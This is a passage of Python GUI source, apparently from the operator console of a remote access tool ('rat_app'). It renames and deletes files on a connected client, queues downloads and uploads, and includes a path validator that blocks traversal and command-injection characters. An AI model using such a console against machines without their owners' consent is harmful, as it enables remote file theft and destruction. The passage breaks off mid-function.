        values = item["values"]
        
        if len(values) < 1:
            return
            
        # Get file name and current path
        file_name = values[0]
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        # Full path for file
        file_path = current_path + file_name
        
        # Ask for new name
        new_name = simpledialog.askstring("Rename", "Enter new name:", initialvalue=file_name)
        if not new_name or new_name == file_name:
            return
            
        # Full path for new name
        new_path = current_path + new_name
        
        # Send command to rename
        try:
            command = f"RENAME|{file_path}|{new_path}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Wait for response
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.rat_app.log(f"Renamed: {file_path} to {new_path}")
                # Refresh file list
                self.list_remote_files()
            else:
                self.rat_app.log(f"Failed to rename: {response}")
                messagebox.showerror("Error", f"Failed to rename: {response}")
                
        except Exception as e:
            self.rat_app.log(f"Error renaming: {e}")
            messagebox.showerror("Error", f"Error renaming: {e}")
    
    def delete_remote_file(self):
        """Delete a file or folder on the remote system with improved safety checks."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get selected items
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select files or folders to delete")
            return
            
        # Confirm deletion with item count and warning
        count = len(selection)
        if count == 1:
            item = self.files_tree.item(selection[0])
            file_name = item["values"][0]
            file_type = item["values"][2] if len(item["values"]) > 2 else ""
            
            if file_type.lower() == "folder":
                confirm = messagebox.askyesno("Confirm Delete", 
                                            f"Are you sure you want to delete the folder '{file_name}'?\n\n" + 
                                            "Note: Only empty folders can be deleted.",
                                            icon="warning")
            else:
                confirm = messagebox.askyesno("Confirm Delete", 
                                            f"Are you sure you want to delete '{file_name}'?",
                                            icon="warning")
        else:
            confirm = messagebox.askyesno("Confirm Delete", 
                                        f"Are you sure you want to delete {count} items?",
                                        icon="warning")
            
        if not confirm:
            return
            
        # Process each selected item
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        success_count = 0
        error_count = 0
        error_messages = []
        
        for item_id in selection:
            item = self.files_tree.item(item_id)
            file_name = item["values"][0]
            file_type = item["values"][2] if len(item["values"]) > 2 else ""
            
            # Full path for file
            file_path = current_path + file_name
            
            # Send command to delete
            try:
                if file_type.lower() == "folder":
                    command = f"RMDIR|{file_path}"
                else:
                    command = f"DELETE|{file_path}"
                    
                self.rat_app.current_client_socket.send(command.encode())
                
                # Set timeout for response
                self.rat_app.current_client_socket.settimeout(10)
                
                try:
                    # Wait for response
                    response = self.rat_app.current_client_socket.recv(1024).decode()
                    
                    if response.startswith("SUCCESS"):
                        success_count += 1
                        self.rat_app.log(f"Deleted: {file_path}")
                    else:
                        error_count += 1
                        error_msg = f"Failed to delete {file_name}: {response}"
                        self.rat_app.log(error_msg)
                        error_messages.append(error_msg)
                except socket.timeout:
                    error_count += 1
                    error_msg = f"Timeout deleting {file_name}"
                    self.rat_app.log(error_msg)
                    error_messages.append(error_msg)
                finally:
                    self.rat_app.current_client_socket.settimeout(None)
                    
            except Exception as e:
                error_count += 1
                error_msg = f"Error deleting {file_name}: {e}"
                self.rat_app.log(error_msg)
                error_messages.append(error_msg)
        
        # Show result summary
        if error_count == 0:
            messagebox.showinfo("Delete Complete", f"Successfully deleted {success_count} {'item' if success_count == 1 else 'items'}")
        else:
            # Create detailed error report
            error_report = "\n".join(error_messages[:5])  # Show first 5 errors
            if len(error_messages) > 5:
                error_report += f"\n\n...and {len(error_messages) - 5} more errors"
                
            messagebox.showwarning("Delete Partial", 
                                f"Deleted {success_count} items, but encountered {error_count} errors.\n\n" + 
                                error_report)
            
        # Refresh file list
        self.list_remote_files()

    def validate_path(self, path):
        """Validate a path to ensure it's safe and well-formed."""
        # Check for empty path
        if not path or path.strip() == "":
            return False, "Empty path"
            
        # Check for extremely long paths
        if len(path) > 260:  # Windows MAX_PATH limit
            return False, "Path too long"
            
        # Check for suspicious patterns (varies by platform)
        suspicious_patterns = [
            "../", "..\\",  # Directory traversal
            "~", "||", "&&", ";", "|",  # Command injection characters
            "%TEMP%", "%APPDATA%", "%USERPROFILE%",  # Environment variables
            "$HOME", "$USER",  # Unix environment variables
        ]
        
        for pattern in suspicious_patterns:
            if pattern in path:
                return False, f"Path contains suspicious pattern: {pattern}"
                
        return True, ""


    def sanitize_filename(self, filename):
        """Sanitize a filename to remove unsafe characters."""
        # Replace invalid characters
        invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
        for char in invalid_chars:
            filename = filename.replace(char, '_')
            
        # Remove control characters
        filename = ''.join(c for c in filename if ord(c) >= 32)
        
        # Limit length
        max_length = 255  # Common filesystem limit
        if len(filename) > max_length:
            filename = filename[:max_length]
            
        return filename
    

    def calculate_file_hash(self, file_path, algorithm='md5'):
        """Calculate hash of a file for integrity verification."""
        try:
            # Select hash algorithm
            if algorithm.lower() == 'md5':
                hash_algo = hashlib.md5()
            elif algorithm.lower() == 'sha1':
                hash_algo = hashlib.sha1()
            elif algorithm.lower() == 'sha256':
                hash_algo = hashlib.sha256()
            else:
                self.rat_app.log(f"Unsupported hash algorithm: {algorithm}")
                return None
                
            # Read file in chunks and update hash
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(self.CHUNK_SIZE), b''):
                    hash_algo.update(chunk)
                    
            return hash_algo.hexdigest()
            
        except Exception as e:
            self.rat_app.log(f"Error calculating file hash: {e}")
            return None
    
    def copy_path_to_clipboard(self):
        """Copy selected file path to clipboard."""
        if not hasattr(self, 'files_tree'):
            return
            
        selection = self.files_tree.selection()
        if not selection:
            return
            
        # Get item information
        item = self.files_tree.item(selection[0])
        file_name = item["values"][0]
        
        # Get current path
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        # Full path for file
        file_path = current_path + file_name
        
        # Copy to clipboard
        self.parent.clipboard_clear()
        self.parent.clipboard_append(file_path)
        
        # Show feedback
        self.rat_app.log(f"Copied to clipboard: {file_path}")
        
        # Optional toast notification
        self.show_toast_notification("Path copied to clipboard")
    
    def show_toast_notification(self, message, duration=2000):
        """Show a temporary toast notification."""
        # Create toast window
        theme = self.get_theme_colors()
        toast = ctk.CTkToplevel(self.parent)
        toast.title("")
        toast.overrideredirect(True)  # Remove window decorations
        
        # Calculate position (bottom right of parent window)
        parent_x = self.parent.winfo_rootx()
        parent_y = self.parent.winfo_rooty()
        parent_width = self.parent.winfo_width()
        parent_height = self.parent.winfo_height()
        
        # Create toast content
        toast_frame = ctk.CTkFrame(toast, fg_color=theme["card_color"],
                               corner_radius=10)
        toast_frame.pack(padx=2, pady=2)
        
        toast_label = ctk.CTkLabel(toast_frame, text=message, 
                               font=ctk.CTkFont(size=12),
                               padx=15, pady=10)
        toast_label.pack()
        
        # Position the toast
        toast.update_idletasks()  # Update to get correct dimensions
        toast_width = toast.winfo_width()
        toast_height = toast.winfo_height()
        
        toast_x = parent_x + parent_width - toast_width - 20
        toast_y = parent_y + parent_height - toast_height - 20
        
        toast.geometry(f"+{toast_x}+{toast_y}")
        
        # Auto-close after duration
        toast.after(duration, toast.destroy)
    
    def add_to_queue(self):
        """Add selected files to the transfer queue."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get selected items
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select files to add to queue")
            return
            
        # Get destination directory
        dest_path = self.download_dest_entry.get()
        if not dest_path:
            dest_path = filedialog.askdirectory(title="Select Destination Folder")
            if not dest_path:
                return
            self.download_dest_entry.delete(0, tk.END)
            self.download_dest_entry.insert(0, dest_path)
        
        # Ensure queue storage exists
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Process each selected item
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
        
        # Get current priority setting
        priority = self.priority_var.get() if hasattr(self, 'priority_var') else "Normal"
        
        # Add each file to queue
        added_count = 0
        for item_id in selection:
            item = self.files_tree.item(item_id)
            values = item["values"]
            
            file_name = values[0]
            file_size = values[1] if len(values) > 1 else "0 B"
            file_type = values[2] if len(values) > 2 else ""
            
            # Skip folders for now (they could be handled with recursive download)
            if file_type.lower() == "folder":
                continue
                
            # Full path for file
            file_path = current_path + file_name
            
            # Add to queue
            queue_item = {
                'type': 'Download',
                'source': file_path,
                'destination': os.path.join(dest_path, file_name),
                'size': file_size,
                'priority': priority,
                'status': 'Pending',
                'added_time': time.time()
            }
            
            self.queue_items.append(queue_item)
            added_count += 1
        
        # Update queue display
        self.update_queue_display()
        
        # Show feedback
        if added_count > 0:
            self.rat_app.log(f"Added {added_count} files to queue")
            messagebox.showinfo("Queue Updated", f"Added {added_count} files to queue")
            
            # Switch to queue tab
            self.transfer_notebook.select(2)  # Index for queue tab
    
    def process_selected_queue(self):
        """Process selected items from the queue."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select queue items to process")
            return
            
        # Get selected indices (IDs are 1-based in the UI, 0-based in the list)
        selected_indices = []
        for item_id in selection:
            item = self.queue_tree.item(item_id)
            try:
                idx = int(item["values"][0]) - 1  # Convert to 0-based index
                if 0 <= idx < len(self.queue_items):
                    selected_indices.append(idx)
            except:
                continue
                
        if not selected_indices:
            return
            
        # Process each selected item
        for idx in sorted(selected_indices):
            queue_item = self.queue_items[idx]
            
            # Update status
            queue_item['status'] = 'Processing'
            self.update_queue_display()
            
            # Process based on type
            if queue_item['type'] == 'Download':
                self.process_download_item(queue_item)
            elif queue_item['type'] == 'Upload':
                self.process_upload_item(queue_item)
                
            # Remove from queue after processing
            try:
                self.queue_items.pop(idx)
            except:
                pass
                
        # Final update of queue display
        self.update_queue_display()
    
    def process_all_queue(self):
        """Process all items in the queue."""
        if not hasattr(self, 'queue_items') or not self.queue_items:
            messagebox.showinfo("Empty Queue", "No items in queue to process")
            return
            
        # Ask for confirmation
        count = len(self.queue_items)
        confirm = messagebox.askyesno("Confirm Process All", 
                                    f"Process all {count} items in the queue?")
        if not confirm:
            return
            
        # Sort queue by priority
        priority_order = {"High": 0, "Normal": 1, "Low": 2}
        sorted_queue = sorted(self.queue_items, 
                            key=lambda x: priority_order.get(x.get('priority', "Normal"), 1))
        
        # Process each item
        for queue_item in sorted_queue[:]:  # Work on a copy to avoid modification issues
            # Update status
            queue_item['status'] = 'Processing'
            self.update_queue_display()
            
            # Process based on type
            if queue_item['type'] == 'Download':
                self.process_download_item(queue_item)
            elif queue_item['type'] == 'Upload':
                self.process_upload_item(queue_item)
                
            # Remove from queue after processing
            try:
                self.queue_items.remove(queue_item)
            except:
                pass
                
            # Update display after each item
            self.update_queue_display()
    
    def process_download_item(self, queue_item):
        """Process a download item from the queue."""
        # Extract info from queue item
        remote_file = queue_item['source']
        local_dest = os.path.dirname(queue_item['destination'])
        
        try:
            # Update UI
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.status_value.configure(text=f"Downloading: {os.path.basename(remote_file)}")
            
            # Call download function
            self.download_file_thread(remote_file, local_dest)
            
            # Add to history
            self.add_to_history(queue_item, "Complete")
            
        except Exception as e:
            self.rat_app.log(f"Queue download error: {e}")
            self.add_to_history(queue_item, "Failed")
            
        finally:
            # Restore UI
            self.update_ui_for_transfer(False)
    
    def process_upload_item(self, queue_item):
        """Process an upload item from the queue."""
        # Extract info from queue item
        local_file = queue_item['source']
        remote_dest = os.path.dirname(queue_item['destination'])
        
        try:
            # Update UI
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.status_value.configure(text=f"Uploading: {os.path.basename(local_file)}")
            
            # Call upload function
            self.upload_file_thread(local_file, remote_dest)
            
            # Add to history
            self.add_to_history(queue_item, "Complete")
            
        except Exception as e:
            self.rat_app.log(f"Queue upload error: {e}")
            self.add_to_history(queue_item, "Failed")
            
        finally:
            # Restore UI
            self.update_ui_for_transfer(False)
    
    def clear_queue(self):
        """Clear all items from the queue."""
        if not hasattr(self, 'queue_items') or not self.queue_items:
            return
            
        # Ask for confirmation
        count = len(self.queue_items)
        confirm = messagebox.askyesno("Confirm Clear Queue", 
                                     f"Remove all {count} items from the queue?")
        if not confirm:
            return
            
        # Clear queue
        self.queue_items = []
        
        # Update display
        self.update_queue_display()
        
        # Show feedback
        self.rat_app.log("Queue cleared")
    
    def remove_from_queue(self):
        """Remove selected items from the queue."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection:
            return
            
        # Get selected indices (IDs are 1-based in the UI, 0-based in the list)
        selected_indices = []
        for item_id in selection:
            item = self.queue_tree.item(item_id)
            try:
                idx = int(item["values"][0]) - 1  # Convert to 0-based index
                if 0 <= idx < len(self.queue_items):
                    selected_indices.append(idx)
            except:
                continue
                
        if not selected_indices:
            return
            
        # Remove items in reverse order to avoid index shifting
        for idx in sorted(selected_indices, reverse=True):
            try:
                self.queue_items.pop(idx)
            except:
                pass
                
        # Update display
        self.update_queue_display()
    
    def move_queue_item(self, direction):
        """Move selected queue item up or down in the queue."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection or len(selection) != 1:
            return  # Only move one item at a time
            
        # Get selected index
        item = self.queue_tree.item(selection[0])
        try:
            idx = int(item["values"][0]) - 1  # Convert to 0-based index
            if not (0 <= idx < len(self.queue_items)):
                return
        except:
            return
            
        # Move item
        if direction == "up" and idx > 0:
            # Swap with previous item
            self.queue_items[idx], self.queue_items[idx-1] = self.queue_items[idx-1], self.queue_items[idx]
            new_idx = idx - 1
        elif direction == "down" and idx < len(self.queue_items) - 1:
            # Swap with next item
            self.queue_items[idx], self.queue_items[idx+1] = self.queue_items[idx+1], self.queue_items[idx]
            new_idx = idx + 1
        else:
            return  # Can't move further
            
        # Update display
        self.update_queue_display()
        
        # Reselect the moved item
        try:
            self.queue_tree.selection_set(self.queue_tree.get_children()[new_idx])
        except:
            pass
    
    def change_queue_priority(self):
        """Change priority of selected queue items."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection:
            return
            
        # Get selected indices
        selected_indices = []
        for item_id in selection:
            item = self.queue_tree.item(item_id)
            try:
                idx = int(item["values"][0]) - 1  # Convert to 0-based index
                if 0 <= idx < len(self.queue_items):
                    selected_indices.append(idx)
            except:
                continue
                
        if not selected_indices:
            return
            
        # Ask for new priority
        theme = self.get_theme_colors()
        priority_dialog = ctk.CTkToplevel(self.file_frame)
        priority_dialog.title("Change Priority")
        priority_dialog.geometry("300x150")
        priority_dialog.grab_set()
        
        # Create dialog content
        dialog_frame = ctk.CTkFrame(priority_dialog)
        dialog_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        dialog_label = ctk.CTkLabel(dialog_frame, text="Select new priority:")
        dialog_label.pack(pady=10)
        
        # Priority options
        priority_var = tk.StringVar(value="Normal")
        
        radio_frame = ctk.CTkFrame(dialog_frame, fg_color="transparent")
        radio_frame.pack(pady=10)
        
        high_radio = ctk.CTkRadioButton(radio_frame, text="High", variable=priority_var, 
                                     value="High", fg_color=theme["accent_color"])
        high_radio.pack(side=tk.LEFT, padx=10)
        
        normal_radio = ctk.CTkRadioButton(radio_frame, text="Normal", variable=priority_var, 
                                       value="Normal", fg_color=theme["accent_color"])
        normal_radio.pack(side=tk.LEFT, padx=10)
        
        low_radio = ctk.CTkRadioButton(radio_frame, text="Low", variable=priority_var, 
                                    value="Low", fg_color=theme["accent_color"])
        low_radio.pack(side=tk.LEFT, padx=10)
        
        # Button functions
        def apply_priority():
            new_priority = priority_var.get()
            for idx in selected_indices:
                self.queue_items[idx]['priority'] = new_priority
            self.update_queue_display()
            priority_dialog.destroy()
            
        def cancel():
            priority_dialog.destroy()
        
        # Buttons
        button_frame = ctk.CTkFrame(dialog_frame, fg_color="transparent")
        button_frame.pack(pady=10)
        
        apply_btn = ctk.CTkButton(button_frame, text="Apply", command=apply_priority,
                              fg_color=theme["accent_color"], hover_color=theme["hover_color"])
        apply_btn.pack(side=tk.LEFT, padx=10)
        
        cancel_btn = ctk.CTkButton(button_frame, text="Cancel", command=cancel,
                               fg_color=theme["button_color"], hover_color=theme["hover_color"])
        cancel_btn.pack(side=tk.LEFT, padx=10)
    
    def add_to_history(self, item, status):
        """Add a completed transfer to the history."""
        if not hasattr(self, 'history_items'):
            self.history_items = []
            
        # Create history entry
        now = datetime.now()
        
        history_item = {
            'date': now.strftime("%Y-%m-%d"),
            'time': now.strftime("%H:%M:%S"),
            'type': item.get('type', 'Unknown'),
            'file': os.path.basename(item.get('source', '')),
            'size': item.get('size', '0 B'),
            'destination': item.get('destination', ''),
            'status': status,
            'duration': item.get('duration', '0s')
        }
        
        # Add to history
        self.history_items.append(history_item)
        
        # Update total transfers count
        if hasattr(self, 'total_transfers_label'):
            count = len(self.history_items)
            self.total_transfers_label.configure(text=f"Total Transfers: {count}")
        
        # Save history
        self.save_history()
    
    def clear_history(self):
        """Clear the transfer history."""
        if not hasattr(self, 'history_items') or not self.history_items:
            return
            
        # Ask for confirmation
        count = len(self.history_items)
        confirm = messagebox.askyesno("Confirm Clear History", 
                                     f"Remove all {count} items from history?")
        if not confirm:
            return
            
        # Clear history
        self.history_items = []
        
        # Update display
        self.update_history_display()
        
        # Reset total transfers count
        if hasattr(self, 'total_transfers_label'):
            self.total_transfers_label.configure(text="Total Transfers: 0")
        
        # Save empty history
        self.save_history()
        
        # Show feedback
        self.rat_app.log("History cleared")
    
    def export_history(self):
        """Export the transfer history to a CSV file."""
        if not hasattr(self, 'history_items') or not self.history_items:
            messagebox.showinfo("Empty History", "No history items to export")
            return
            
        # Ask for save location
        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")],
            title="Save History As"
        )
        
        if not file_path:
            return
            
        try:
            # Write CSV
            with open(file_path, 'w', newline='') as csvfile:
                fieldnames = ['date', 'time', 'type', 'file', 'size', 'destination', 'status', 'duration']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                
                writer.writeheader()
                for item in self.history_items:
                    writer.writerow(item)
                    
            # Show success
            self.rat_app.log(f"History exported to {file_path}")
            messagebox.showinfo("Export Complete", f"History exported to {file_path}")
            
        except Exception as e:
            self.rat_app.log(f"Error exporting history: {e}")
            messagebox.showerror("Export Error", f"Error exporting history: {e}")
    
    def filter_history(self, event=None):
        """Apply filters to history display."""
        self.update_history_display()
    
    def save_history(self):
        """Save history to a file."""
        if not hasattr(self, 'history_items'):
            return
            
        try:
            with open("transfer_history.json", "w") as f:
                json.dump(self.history_items, f)
        except Exception as e:
            self.rat_app.log(f"Error saving history: {e}")
    
    def load_history(self):
        """Load history from a file."""
        try:
            if os.path.exists("transfer_history.json"):
                with open("transfer_history.json", "r") as f:
                    self.history_items = json.load(f)
                    
                    # Update total transfers count
                    if hasattr(self, 'total_transfers_label'):
                        count = len(self.history_items)
                        self.total_transfers_label.configure(text=f"Total Transfers: {count}")
        except Exception as e:
            self.rat_app.log(f"Error loading history: {e}")
            self.history_items = []
    
    
    def toggle_pause_resume(self):
        """Toggle between pause and resume for current transfer."""
        if not hasattr(self, 'is_paused'):
            self.is_paused = False
            
        self.is_paused = not self.is_paused
        
        if self.is_paused:
            # Pause transfer
            self.pause_btn.configure(text="Resume")
            self.status_value.configure(text="Paused")
        else:
            # Resume transfer
            self.pause_btn.configure(text="Pause")
            self.status_value.configure(text="Transferring")

    
    #--------------------------------------------------------
    # Core File Transfer Methods
    #--------------------------------------------------------
    
    def browse_upload_file(self):
        """Browse for a file to upload with enhanced functionality."""
        if self.multiple_files_var.get():
            file_paths = filedialog.askopenfilenames(title="Select Files to Upload")
            if not file_paths:
                return
                
            # Show count in the text field
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, f"{len(file_paths)} files selected")
            
            # Store the list for later use
            self.selected_files = list(file_paths)
            
            # Update file info with multi-file summary
            self.update_multifile_info(file_paths)
        else:
            file_path = filedialog.askopenfilename(title="Select File to Upload")
            if not file_path:
                return
                
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, file_path)
            
            # Store single file path
            self.selected_files = [file_path]
            
            # Update file info
            self.update_file_info(file_path)
    
    def browse_download_dest(self):
        """Browse for a download destination folder."""
        folder_path = filedialog.askdirectory(title="Select Destination Folder")
        if folder_path:
            self.download_dest_entry.delete(0, tk.END)
            self.download_dest_entry.insert(0, folder_path)
    
    def update_file_info(self, file_path):
        """Update file info display with enhanced details."""
        try:
            file_stats = os.stat(file_path)
            file_size = file_stats.st_size
            last_modified = time.ctime(file_stats.st_mtime)
            created_time = time.ctime(file_stats.st_ctime)
            
            file_name = os.path.basename(file_path)
            file_ext = os.path.splitext(file_name)[1]
            
            # Get file type description
            file_type = self.get_file_type_description(file_ext)
            
            # Calculate MD5 hash for small files (optional)
            md5_hash = ""
            if file_size < 50 * 1024 * 1024:  # Only for files smaller than 50 MB
                try:
                    with open(file_path, 'rb') as f:
                        md5_hash = hashlib.md5(f.read()).hexdigest()
                except:
                    md5_hash = "Unable to calculate"
            else:
                md5_hash = "File too large"
            
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"File Name: {file_name}\n")
            self.upload_info_text.insert(tk.END, f"Size: {self.format_size(file_size)}\n")
            self.upload_info_text.insert(tk.END, f"Type: {file_type}\n")
            self.upload_info_text.insert(tk.END, f"Created: {created_time}\n")
            self.upload_info_text.insert(tk.END, f"Last Modified: {last_modified}\n")
            self.upload_info_text.insert(tk.END, f"Location: {os.path.dirname(file_path)}\n")
            self.upload_info_text.insert(tk.END, f"MD5 Hash: {md5_hash}\n")
            
            # Estimated transfer time (based on average speed)
            avg_speed = 1024 * 1024  # 1 MB/s as default
            est_time = file_size / avg_speed if avg_speed > 0 else 0
            est_time_str = self.format_time(est_time)
            self.upload_info_text.insert(tk.END, f"Est. Transfer Time: {est_time_str}\n")
            
            self.upload_info_text.configure(state="disabled")
            
        except Exception as e:
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"Error getting file info: {e}")
            self.upload_info_text.configure(state="disabled")
    
    def update_multifile_info(self, file_paths):
        """Update file info display with summary of multiple files."""
        try:
            # Calculate total stats
            total_size = 0
            file_types = {}
            newest_mod_time = 0
            
            for path in file_paths:
                try:
                    file_stats = os.stat(path)
                    total_size += file_stats.st_size
                    
                    # Track file types
                    file_ext = os.path.splitext(path)[1].lower()
                    if file_ext in file_types:
                        file_types[file_ext] += 1
                    else:
                        file_types[file_ext] = 1
                        
                    # Track newest modified time
                    if file_stats.st_mtime > newest_mod_time:
                        newest_mod_time = file_stats.st_mtime
                except:
                    continue
            
            # Format file type summary
            type_summary = ", ".join([f"{count} {ext}" for ext, count in file_types.items()])
            
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"Files Selected: {len(file_paths)}\n")
            self.upload_info_text.insert(tk.END, f"Total Size: {self.format_size(total_size)}\n")
            self.upload_info_text.insert(tk.END, f"File Types: {type_summary}\n")
            self.upload_info_text.insert(tk.END, f"Most Recent Modified: {time.ctime(newest_mod_time)}\n")
            
            # Estimate transfer time
            avg_speed = 1024 * 1024  # 1 MB/s as default
            est_time = total_size / avg_speed if avg_speed > 0 else 0
            est_time_str = self.format_time(est_time)
            self.upload_info_text.insert(tk.END, f"Est. Transfer Time: {est_time_str}\n")
            
            self.upload_info_text.configure(state="disabled")
            
        except Exception as e:
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"Error getting files info: {e}")
            self.upload_info_text.configure(state="disabled")
    
    def get_file_type_description(self, extension):
        """Get a human-readable description of a file type."""
        extension = extension.lower()
        file_types = {
            ".txt": "Text Document",
            ".pdf": "PDF Document",
            ".doc": "Word Document",
            ".docx": "Word Document",
            ".xls": "Excel Spreadsheet",
            ".xlsx": "Excel Spreadsheet",
            ".ppt": "PowerPoint Presentation",
            ".pptx": "PowerPoint Presentation",
            ".jpg": "JPEG Image",
            ".jpeg": "JPEG Image",
            ".png": "PNG Image",
            ".gif": "GIF Image",
            ".mp3": "MP3 Audio",
            ".mp4": "MP4 Video",
            ".zip": "ZIP Archive",
            ".rar": "RAR Archive",
            ".exe": "Executable",
            ".dll": "Dynamic Link Library",
            ".py": "Python Script",
            ".js": "JavaScript File",
            ".html": "HTML Document",
            ".css": "CSS Stylesheet",
            ".json": "JSON File",
            ".xml": "XML File",
            ".csv": "CSV Spreadsheet",
            ".md": "Markdown Document"
        }
        
        return file_types.get(extension, f"{extension} File" if extension else "Unknown")
    
    def format_size(self, size_bytes):
        """Convert byte size to human readable format with improved precision."""
        if size_bytes < 0:
            return "0 B"
            
        units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
        i = 0
        while size_bytes >= 1024 and i < len(units) - 1:
            size_bytes /= 1024.0
            i += 1
            
        # Use more appropriate precision based on unit
        if i == 0:  # Bytes
            return f"{int(size_bytes)} {units[i]}"
        elif i == 1:  # KB
            return f"{size_bytes:.1f} {units[i]}"
        else:  # MB and above
            return f"{size_bytes:.2f} {units[i]}"
    
    def format_time(self, seconds):
        """Format time in seconds to a human-readable string."""
        if seconds < 1:
            return "less than a second"
            
        units = [
            (60 * 60 * 24, "day"),
            (60 * 60, "hour"),
            (60, "minute"),
            (1, "second")
        ]
        
        parts = []
        for unit_value, unit_name in units:
            if seconds >= unit_value:
                count = int(seconds / unit_value)
                seconds %= unit_value
                parts.append(f"{count} {unit_name}{'s' if count > 1 else ''}")
                
                # Stop after 2 units
                if len(parts) >= 2:
                    break
        
        return " ".join(parts)
    
    def update_ui_for_transfer(self, is_transferring=True):
        """Update UI elements based on transfer state with enhanced controls."""
        if is_transferring:
            # Disable controls during transfer
            self.upload_btn.configure(state="disabled")
            self.download_btn.configure(state="disabled")
            
            # Enable controls for active transfer
            self.cancel_btn.configure(state="normal")
            self.pause_btn.configure(state="normal") 
            self.resume_btn.configure(state="disabled")
            
            # Reset progress indicators
            self.progress_bar.set(0)
            self.progress_text.configure(text="0%")
            self.progress_details.configure(text="0 B / 0 B")
            self.speed_label.configure(text="0 B/s")
            self.eta_label.configure(text="--:--")
            
            # Show transfer in progress in connection status
            self.connection_status.configure(text="", text_color="#00AA00")
        else:
            # Enable main controls
            self.upload_btn.configure(state="normal")
            self.download_btn.configure(state="normal")
            
            # Disable transfer controls
            self.cancel_btn.configure(state="disabled")
            self.pause_btn.configure(state="disabled")
            
            # Reset progress indicators
            self.progress_bar.set(0)
            self.progress_text.configure(text="0%")
            self.progress_details.configure(text="0 B / 0 B")
            self.speed_label.configure(text="0 B/s")
            self.eta_label.configure(text="--:--")
            self.status_value.configure(text="Idle")
            
            # Enable resume button if we have any saved transfer states
            if hasattr(self, 'transfer_states') and self.transfer_states:
                self.resume_btn.configure(state="normal")
            else:
                self.resume_btn.configure(state="disabled")
                
            # Update connection status
            if self.rat_app.current_client_socket:
                self.connection_status.configure(text="", text_color="#00AA00")
            else:
                self.connection_status.configure(text="", text_color="#FF5555")
    
    def cancel_transfer(self):
        """Cancel the current transfer with enhanced feedback."""
        self.stop_transfer = True
        self.status_value.configure(text="Cancelling...")
        
        # Record cancellation in history if transfer is active
        if hasattr(self, 'current_transfer') and self.current_transfer:
            self.add_to_history(self.current_transfer, "Cancelled")
    
    def update_progress(self, current, total, start_time):
        """Update all progress indicators with consistent metrics."""
        if total <= 0:
            return
            
        # Calculate progress percentage
        progress = current / total
        self.progress_bar.set(progress)
        
        # Update percentage text
        percentage = int(progress * 100)
        self.progress_text.configure(text=f"{percentage}%")
        
        # Update size details
        self.progress_details.configure(text=f"{self.format_size(current)} / {self.format_size(total)}")
        
        # Calculate and update speed
        elapsed_time = time.time() - start_time
        if elapsed_time > 0:
            speed = current / elapsed_time
            self.speed_label.configure(text=f"{self.format_size(speed)}/s")
            
            # Calculate and update ETA
            if speed > 0:
                remaining_bytes = total - current
                eta_seconds = remaining_bytes / speed
                
                # Format ETA
                if eta_seconds < 60:
                    eta_str = f"{int(eta_seconds)}s"
                elif eta_seconds < 3600:
                    minutes = int(eta_seconds / 60)
                    seconds = int(eta_seconds % 60)
                    eta_str = f"{minutes}m {seconds}s"
                else:
                    hours = int(eta_seconds / 3600)
                    minutes = int((eta_seconds % 3600) / 60)
                    eta_str = f"{hours}h {minutes}m"
                    
                self.eta_label.configure(text=eta_str)
    
    # File upload functionality with improved error handling and reporting
    def upload_file(self):
        """Start a file upload with enhanced multi-file support."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "No client connected")
            return
        
        # Check if we're in single or multi-file mode
        if not hasattr(self, 'selected_files') or not self.selected_files:
            messagebox.showinfo("No Files", "No files selected for upload")
            return
            
        dest_path = self.upload_dest_entry.get()
        if not dest_path:
            messagebox.showinfo("Missing Destination", "Please specify a destination path")
            return
        
        # Update client info label
        for addr, (client_id, conn) in self.rat_app.clients.items():
